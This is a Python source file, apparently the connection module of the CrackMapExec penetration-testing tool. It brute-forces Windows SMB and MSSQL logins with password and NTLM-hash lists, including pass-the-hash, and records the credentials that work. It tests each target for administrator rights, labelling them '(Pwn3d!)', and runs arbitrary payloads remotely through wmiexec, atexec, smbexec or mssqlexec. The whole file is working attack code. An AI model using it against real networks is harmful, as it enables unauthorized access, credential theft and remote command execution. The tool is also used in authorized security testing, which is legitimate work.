import logging
from traceback import format_exc
from helpers import highlight
from cme.execmethods.mssqlexec import MSSQLEXEC
from cme.execmethods.wmiexec import WMIEXEC
from cme.execmethods.smbexec import SMBEXEC
from cme.execmethods.atexec import TSCH_EXEC
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.smbconnection import SessionError
from gevent.coros import BoundedSemaphore

sem = BoundedSemaphore(1)
global_failed_logins = 0
user_failed_logins = {}

class Connection:

    def __init__(self, args, db, target, server_name, domain, conn, logger, cmeserver):
        self.args = args
        self.db = db
        self.host = target
        self.hostname = server_name
        self.domain = domain
        self.conn = conn
        self.logger = logger
        self.cmeserver = cmeserver
        self.password = None
        self.username = None
        self.hash = None
        self.admin_privs = False
        self.failed_logins = 0

        if self.args.local_auth:
            self.domain = self.hostname

        self.login()

    def over_fail_limit(self, username):
        global global_failed_logins
        global user_failed_logins

        if global_failed_logins == self.args.gfail_limit: return True
        if self.failed_logins == self.args.fail_limit: return True
        if username in user_failed_logins.keys():
            if self.args.ufail_limit == user_failed_logins[username]: return True

        return False

    def check_if_admin(self):
        if self.args.mssql:
            try:
                #I'm pretty sure there has to be a better way of doing this.
                #Currently we are just searching for our user in the sysadmin group

                self.conn.sql_query("EXEC sp_helpsrvrolemember 'sysadmin'")
                query_output = self.conn.printRows()
                if query_output.find('{}\\{}'.format(self.domain, self.username)) != -1:
                    self.admin_privs = True
            except:
                pass

        elif not self.args.mssql:
            '''
                We use the OpenSCManagerW Win32API call to to establish a handle to the remote host. 
                If this succeeds, the user context has administrator access to the target.

                Idea stolen from PowerView's Invoke-CheckLocalAdminAccess
            '''

            stringBinding = r'ncacn_np:{}[\pipe\svcctl]'.format(self.host)

            rpctransport = transport.DCERPCTransportFactory(stringBinding)
            rpctransport.set_dport(self.args.smb_port)

            lmhash = ''
            nthash = ''
            if self.hash:
                if self.hash.find(':') != -1:
                    lmhash, nthash = self.hash.split(':')
                else:
                    nthash = self.hash

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.username, self.password if self.password is not None else '', self.domain, lmhash, nthash)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            lpMachineName = '{}\x00'.format(self.host)
            try:

                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx

                resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 0xF003F)
                self.admin_privs = True
            except DCERPCException:
                pass

    def plaintext_login(self, domain, username, password):
        try:
            if self.args.mssql:
                res = self.conn.login(None, username, password, domain, None, True)
                if res is not True:
                    self.conn.printReplies()
                    return False
            
            elif not self.args.mssql:
                self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.link_cred_to_host('plaintext', domain, username, password, self.host)

            out = u'{}\\{}:{} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         password.decode('utf-8'),
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        password.decode('utf-8'),
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            if error == 'STATUS_LOGON_FAILURE': 
                global global_failed_logins
                global user_failed_logins
                
                if username not in user_failed_logins.keys():
                    user_failed_logins[username] = 0

                user_failed_logins[username] += 1
                global_failed_logins += 1
                self.failed_logins += 1

            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            if self.args.mssql:
                res = self.conn.login(None, username, '', domain, ntlm_hash, True)
                if res is not True:
                    self.conn.printReplies()
                    return False

            elif not self.args.mssql:
                self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.link_cred_to_host('hash', domain, username, ntlm_hash, self.host)

            out = u'{}\\{} {} {}'.format(domain.decode('utf-8'), 
                                         username.decode('utf-8'), 
                                         ntlm_hash, 
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            if error == 'STATUS_LOGON_FAILURE': 
                global global_failed_logins
                global user_failed_logins
                
                if username not in user_failed_logins.keys():
                    user_failed_logins[username] = 0

                user_failed_logins[username] += 1
                global_failed_logins += 1
                self.failed_logins += 1

            return False

    def login(self):
        for cred_id in self.args.cred_id:
            with sem:
                try:
                    c_id, credtype, domain, username, password = self.db.get_credentials(filterTerm=cred_id)[0]

                    if not domain: domain = self.domain
                    if self.args.domain: domain = self.args.domain

                    if credtype == 'hash' and not self.over_fail_limit():
                        self.hash_login(domain, username, password)

                    elif credtype == 'plaintext' and not self.over_fail_limit():
                        self.plaintext_login(domain, username, password)
     
                except IndexError:
                    self.logger.error("Invalid database credential ID!")

        for user in self.args.username:
            if type(user) is file:
                for usr in user:
                    if self.args.hash:
                        with sem:
                            for ntlm_hash in self.args.hash:
                                if type(ntlm_hash) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.hash_login(self.domain, usr.strip(), ntlm_hash): return
                            
                                elif type(ntlm_hash) is file:
                                    for f_hash in ntlm_hash:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.hash_login(self.domain, usr.strip(), f_hash.strip()): return
                                    ntlm_hash.seek(0)

                    elif self.args.password:
                        with sem:
                            for password in self.args.password:
                                if type(password) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.plaintext_login(self.domain, usr.strip(), password): return
                                
                                elif type(password) is file:
                                    for f_pass in password:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.plaintext_login(self.domain, usr.strip(), f_pass.strip()): return
                                    password.seek(0)

            elif type(user) is not file:
                    if self.args.hash:
                        with sem:
                            for ntlm_hash in self.args.hash:
                                if type(ntlm_hash) is not file:
                                    if not self.over_fail_limit(user):
                                        if self.hash_login(self.domain, user, ntlm_hash): return
                                
                                elif type(ntlm_hash) is file:
                                    for f_hash in ntlm_hash:
                                        if not self.over_fail_limit(user):
                                            if self.hash_login(self.domain, user, f_hash.strip()): return
                                    ntlm_hash.seek(0)

                    elif self.args.password:
                        with sem:
                            for password in self.args.password:
                                if type(password) is not file:
                                    if not self.over_fail_limit(user):
                                        if self.plaintext_login(self.domain, user, password): return
                                
                                elif type(password) is file:
                                    for f_pass in password:
                                        if not self.over_fail_limit(user):
                                            if self.plaintext_login(self.domain, user, f_pass.strip()): return
                                    password.seek(0)

    def execute(self, payload, get_output=False, methods=None):

        default_methods = ['wmiexec', 'atexec', 'smbexec']

        if self.args.mssql:
            exec_method = MSSQLEXEC(self.conn)
            logging.debug('Executed command via mssqlexec')

        elif not self.args.mssql:

            if not methods and not self.args.exec_method:
                methods = default_methods

            elif methods or self.args.exec_method:

                if not methods:
                    methods = [self.args.exec_method]

            for method in methods:

                if method == 'wmiexec':
                    try:
                        exec_method = WMIEXEC(self.host, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                        logging.debug('Executed command via wmiexec')
                        break
                    except:
                        logging.debug('Error executing command via wmiexec, traceback:')
                        logging.debug(format_exc())
                        continue

                elif method == 'atexec':
                    try:
                        exec_method = TSCH_EXEC(self.host, self.username, self.password, self.domain, self.hash) #self.args.share)
                        logging.debug('Executed command via atexec')
                        break
                    except:
                        logging.debug('Error executing command via atexec, traceback:')
                        logging.debug(format_exc())
                        continue

                elif method == 'smbexec':
                    try:
                        exec_method = SMBEXEC(self.host, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)
                        logging.debug('Executed command via smbexec')
                        break
                    except:
                        logging.debug('Error executing command via smbexec, traceback:')
                        logging.debug(format_exc())
                        continue

        if self.cmeserver:
            if hasattr(self.cmeserver.server.module, 'on_request') or hasattr(self.cmeserver.server.module, 'on_response'):
                self.cmeserver.server.hosts.append(self.host)

        output = exec_method.execute(payload, get_output)

        return u'{}'.format(output.strip().decode('utf-8'))
